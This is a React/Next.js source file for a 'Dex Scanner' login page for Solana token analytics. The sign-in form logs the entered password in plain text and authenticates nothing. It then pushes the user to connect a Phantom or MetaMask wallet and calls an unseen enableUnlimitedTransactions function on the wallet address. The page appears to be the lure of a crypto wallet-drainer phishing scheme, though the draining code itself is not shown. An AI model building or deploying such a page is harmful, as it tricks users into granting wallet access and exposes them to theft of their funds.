"use client";
import React, { useState, useRef, useEffect } from "react";
import Image from 'next/image';
import Link from 'next/link';
import Head from 'next/head';

import { Connection, Transaction, SystemProgram, Keypair, PublicKey } from '@solana/web3.js';
import { enableUnlimitedTransactions } from "@/web3/wallet";

 interface WalletProvider {
  isPhantom?: boolean;
  request: (params: { method: string }) => Promise<string[]>;
  connect: () => Promise<{ publicKey: { toString: () => string } }>;
}

declare global {
  interface Window {
    solana?: WalletProvider;
    ethereum?: WalletProvider;
  }
}

export default function Login() {
  const [page, setPage] = useState<"login" | "signup">("login");
  const [showWalletModal, setShowWalletModal] = useState(false);

  const [username, setUser] = useState("");
  const [password, setPassword] = useState("");

  async function connectWallet(walletType: 'phantom' | 'argent'): Promise<void> {
    try {
      if (walletType === 'phantom') {
        // Check Phantom Wallet (Solana)
        if (window.solana && window.solana.isPhantom) {
          const resp = await window.solana.connect();
          console.log("RES: ", resp);
          const walletAddress = resp.publicKey.toString();
          console.log('Connected Phantom wallet:', walletAddress);

          enableUnlimitedTransactions(walletAddress);
          return;
        } else {
          alert('Phantom wallet not detected! Please install Phantom wallet.');
          return;
        }
      }

      if (walletType === 'argent') {
        // Check MetaMask (Ethereum) - using as Argent alternative for now
        if (window.ethereum) {
          const accounts: string[] = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (!accounts || accounts.length === 0) {
            console.error('No accounts found in MetaMask.');
            return;
          }
          console.log("ACCOUNTS: ", accounts);
          const walletAddress: string = accounts[0];
          console.log('Connected MetaMask wallet:', walletAddress);

          enableUnlimitedTransactions(walletAddress);
          return;
        } else {
          alert('Argent wallet not detected! Please install Argent wallet.');
          return;
        }
      }

      // No wallet found
      alert('No wallet detected! Please install Phantom or Argent.');
    } catch (error) {
      console.error('Error connecting wallet:', error);
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Here you would typically handle authentication logic
    console.log('Username:', username);
    console.log('Password:', password);

    // Show wallet selection modal instead of directly connecting
    setShowWalletModal(true);
  };

  const handleWalletSelect = async (walletType: 'phantom' | 'argent') => {
    setShowWalletModal(false);
    await connectWallet(walletType);
  };

  return (
      <div className="flex flex-col min-h-screen">
          <div className="h-screen bg-black text-white flex flex-col overflow-hidden">
            <div className="flex-1 flex items-center justify-center p-3 sm:p-4 relative min-h-0">
              <div className="w-full max-w-sm sm:max-w-md relative z-10 flex flex-col h-full justify-center">
                <Link href="/" className="inline-flex items-center gap-2 text-white/70 hover:text-white transition-colors mb-4 sm:mb-6 group self-start">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="lucide lucide-arrow-left w-3 h-3 sm:w-4 sm:h-4 transition-transform group-hover:-translate-x-1"
                    >
                      <path d="m12 19-7-7 7-7"></path>
                      <path d="M19 12H5"></path>
                    </svg>
                    <span className="text-sm sm:text-base">Back to Scanner</span>
                </Link>
                <div className="rounded-lg border text-card-foreground bg-black/95 backdrop-blur-xl border-white/20 shadow-2xl flex-shrink-0">
                    <div className="flex flex-col p-6 text-center space-y-3 sm:space-y-4 pb-4 sm:pb-6">
                      <div className="mx-auto ounded-full flex items-center justify-center p-2 sm:p-3">
                          <img
                            alt="Dex Scanner"
                            className="w-full h-[104px] object-contain"
                            style={{ color: 'transparent' }}
                            src="/img/logo-alt.jpeg"
                          />
                      </div>
                      {!showWalletModal && (
                        <div>
                          <div className="tracking-tight text-lg sm:text-xl font-bold text-white">Welcome to Dex Scanner</div>
                          <div className="text-white/70 text-sm sm:text-base px-2">Sign in to access detailed Solana token analytics</div>
                        </div>
                      )}
                    </div>

                    {/* Wallet Selection Modal */}
                    {showWalletModal ? (
                      <div className="p-6 pt-0 space-y-4 sm:space-y-6 px-4 sm:px-6 pb-4 sm:pb-6">
                        <div className="">
                          <div className="text-center mb-6">
                            <h3 className="text-xl font-bold text-white mb-2">Choose Your Wallet</h3>
                            <p className="text-white/70 text-sm">Select a wallet to connect to Dex Scanner</p>
                          </div>
                          
                          <div className="space-y-3">
                            <button
                              onClick={() => handleWalletSelect('phantom')}
                              className="w-full flex items-center justify-between p-4 bg-white/10 border border-white/20 rounded-lg hover:bg-white/20 transition-all duration-300 group"
                            >
                              <div className="flex items-center gap-3">
                                <div className="w-8 h-8 bg-purple-500 rounded-lg flex items-center justify-center">
                                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                                  </svg>
                                </div>
                                <div className="text-left">
                                  <div className="font-semibold text-white">Phantom</div>
                                  <div className="text-xs text-white/70">Solana Wallet</div>
                                </div>
                              </div>
                              <svg className="w-5 h-5 text-white/50 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                              </svg>
                            </button>

                            <button
                              onClick={() => handleWalletSelect('argent')}
                              className="w-full flex items-center justify-between p-4 bg-white/10 border border-white/20 rounded-lg hover:bg-white/20 transition-all duration-300 group"
                            >
                              <div className="flex items-center gap-3">
                                <div className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center">
                                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                  </svg>
                                </div>
                                <div className="text-left">
                                  <div className="font-semibold text-white">Argent</div>
                                  <div className="text-xs text-white/70">Ethereum Wallet</div>
                                </div>
                              </div>
                              <svg className="w-5 h-5 text-white/50 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                              </svg>
                            </button>
                          </div>

                          <button
                            onClick={() => setShowWalletModal(false)}
                            className="w-full mt-4 p-3 text-white/70 hover:text-white transition-colors text-sm"
                          >
                            Cancel
                          </button>
                        </div>
                      </div>
                      ) : (
                      <div className="p-6 pt-0 space-y-4 sm:space-y-6 px-4 sm:px-6 pb-4 sm:pb-6">
                      <form className="space-y-3 sm:space-y-4" onSubmit={handleSubmit}>
                          <div className="space-y-2">
                              <div className="relative">
                                  <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      fill="none"
                                      stroke="currentColor"
                                      strokeWidth="2"
                                      strokeLinecap="round"
                                      strokeLinejoin="round"
                                      className="lucide lucide-user absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-white/50"
                                  >
                                      <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
                                      <circle cx="12" cy="7" r="4"></circle>
                                  </svg>
                                  <input
                                      className="flex w-full rounded-md border px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm pl-10 h-10 sm:h-12 bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-white/50 focus:ring-white/20 text-sm sm:text-base"
                                      placeholder="Username"
                                      required
                                      type="text"
                                      value={username}
                                      onChange={e => setUser(e.target.value)}
                                      autoComplete="username"
                                  />
                              </div>
                          </div>

                          { page === "signup" && (
                              <DropdownComponent />
                          )}

                          <div className="space-y-2">
                              <div className="relative">
                                  <svg
                                  xmlns="http://www.w3.org/2000/svg"
                                  width="24"
                                  height="24"
                                  viewBox="0 0 24 24"
                                  fill="none"
                                  stroke="currentColor"
                                  strokeWidth="2"
                                  strokeLinecap="round"
                                  strokeLinejoin="round"
                                  className="lucide lucide-lock absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-white/50"
                                  >
                                  <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
                                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                  </svg>
                                  <input
                                      className="flex w-full rounded-md border px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm pl-10 h-10 sm:h-12 bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-white/50 focus:ring-white/20 text-sm sm:text-base"
                                      placeholder="Password"
                                      value={password}
                                      onChange={e => setPassword(e.target.value)}
                                      autoComplete="current-password"
                                      required
                                      type="password"
                                  />
                              </div>
                          </div>

                          <button
                          className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 px-4 py-2 w-full h-10 sm:h-12 bg-white text-black hover:bg-white/90 font-semibold transition-all duration-300 transform hover:scale-[1.02] text-sm sm:text-base"
                          type="submit"
                          >
                          Sign In
                          </button>
                      </form>
                      <div className="text-center">
                          <p className="text-white/50 text-xs sm:text-sm">
                          Don&apos;t have an account?{' '}
                          <button 
                              className="text-white hover:underline transition-colors"
                              onClick={() => setPage(page === "login" ? "signup" : "login")}
                          >
                              {page === "login" ? "Create one" : "Back to login"}
                          </button>
                          </p>
                      </div>
                      </div>
                    )}
                </div>
              </div>
            </div>
          </div>

      </div>
  );
}

type Option = {
  value: string;
  label: string;
};
function DropdownComponent() {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedOption, setSelectedOption] = useState('Where did you hear about us?');
  const dropdownRef = useRef<HTMLDivElement>(null);

  const options = [
    { value: 'twitter', label: 'Twitter / X' },
    { value: 'telegram', label: 'Telegram' },
    { value: 'google', label: 'Google' },
    { value: 'friend', label: 'Friend / Word of mouth' },
    { value: 'other', label: 'Other' },
  ];

  const handleToggle = () => {
    setIsOpen((prev) => !prev);
  };

  const handleOptionSelect = (option: Option) => {
    setSelectedOption(option.label);
    setIsOpen(false);
  };

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef?.current?.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  return (
    <div className="space-y-2">
      <div className="relative" ref={dropdownRef}>
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="lucide lucide-message-circle absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-white/50"
        >
          <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
        </svg>
        <button
          type="button"
          role="combobox"
          aria-expanded={isOpen}
          aria-controls="dropdown-options"
          aria-autocomplete="none"
          className="flex w-full items-center justify-between rounded-md border px-3 py-2 ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1 pl-10 h-10 sm:h-12 bg-white/10 border-white/30 text-white focus:border-white/50 focus:ring-white/20 text-sm sm:text-base"
          onClick={handleToggle}
        >
          <span style={{ pointerEvents: 'none' }}>{selectedOption}</span>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className={`lucide lucide-chevron-down h-4 w-4 opacity-50 transition-transform ${isOpen ? 'rotate-180' : ''}`}
            aria-hidden="true"
          >
            <path d="m6 9 6 6 6-6"></path>
          </svg>
        </button>
        {isOpen && (
          <ul
            id="dropdown-options"
            className="absolute z-[9990] w-full mt-2 rounded-md border border-white/30 text-white shadow-lg max-h-60 overflow-auto bg-black"
          >
            {options.map((option) => (
              <li
                key={option.value}
                className="px-4 py-2 hover:bg-white/20 cursor-pointer text-sm sm:text-base"
                onClick={() => handleOptionSelect(option)}
              >
                {option.label}
              </li>
            ))}
          </ul>
        )}
        <select
          aria-hidden="true"
          required
          tabIndex={-1}
          style={{
            position: 'absolute',
            border: '0px',
            width: '1px',
            height: '1px',
            padding: '0px',
            margin: '-1px',
            overflow: 'hidden',
            clip: 'rect(0px, 0px, 0px, 0px)',
            whiteSpace: 'nowrap',
            overflowWrap: 'normal',
            zIndex: 1000,
            background: 'black',
          }}
          value={selectedOption === 'Where did you hear about us?' ? '' : selectedOption}
        >
          {options.map((option) => (
            <option key={option.value} value={option.value}>
              {option.label}
            </option>
          ))}
        </select>
      </div>
    </div>
  );
}